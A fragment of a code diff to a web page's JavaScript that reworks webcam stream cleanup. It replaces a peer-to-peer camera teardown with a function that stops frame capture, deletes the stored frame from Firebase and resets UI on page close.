-      if (miniPill)    miniPill.classList.remove('show');
-      if (remoteVideo) remoteVideo.srcObject = null;
-      resetAdminCamBtn();
-    }
-
-    function stopUserCamera() {
-      if (peer) { peer.destroy(); peer = null; }
-      if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+    function stopUserStream() {
+      if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
+      if (localStream)     { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+      // Remove frame from Firebase so it doesn't persist
+      camFrameRef.remove();
+      const hv = document.getElementById('_hiddenCamVideo');
+      if (hv) { hv.srcObject = null; }
     }
 
     function resetAdminCamBtn() {
@@ -1155,11 +1198,20 @@
       b.disabled = false;
     }
 
-    function svgCam()    { return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:15px;height:15px;flex-shrink:0"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>'; }
-    function svgCamOff() { return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:15px;height:15px;flex-shrink:0"><line x1="1" y1="1" x2="23" y2="23"/><path d="M21 21H3a2 2 0 01-2-2V8a2 2 0 012-2h3m3-3h6l2 3h4a2 2 0 012 2v9.34"/></svg>'; }
+    function svgCam() {
+      return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:15px;height:15px;flex-shrink:0"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>';
+    }
+    function svgCamOff() {
+      return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:15px;height:15px;flex-shrink:0"><line x1="1" y1="1" x2="23" y2="23"/><path d="M21 21H3a2 2 0 01-2-2V8a2 2 0 012-2h3m3-3h6l2 3h4a2 2 0 012 2v9.34"/></svg>';
+    }
 
+    // Cleanup on page close
     window.addEventListener('pagehide', () => {
-      if (role === 'user') stopUserCamera();
+      if (role === 'user')      { stopUserStream(); camStatusRef.set('stopped'); }
+      if (role === 'assistant') { camRef.remove(); }
+    });
+    window.addEventListener('beforeunload', () => {
+      if (role === 'user')      stopUserStream();
       if (role === 'assistant') camRef.remove();
     });
 
